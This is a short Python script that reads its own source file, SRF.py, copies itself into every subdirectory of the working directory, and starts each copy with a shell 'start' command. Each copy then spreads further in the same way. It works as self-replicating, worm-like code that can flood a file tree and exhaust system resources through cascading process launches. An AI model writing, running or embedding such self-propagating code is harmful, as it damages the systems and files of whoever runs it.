import time
import os
A=os.getcwd()
f=open("SRF.py","r")
V=(f.read())
f.close()
try:
        #os.remove("SRF.py")
        pass
except:
        print("file denied")
for i in os.listdir(os.getcwd()):
        
                
        try:
                os.chdir(str(A)+"/"+str(i))
                f=open("SRF.py","w")
                f.write(V)
                f.close()
                print(str(A)+"/"+str(i))
                os.system("start SRF.py")
        except:
                print("nope")

        




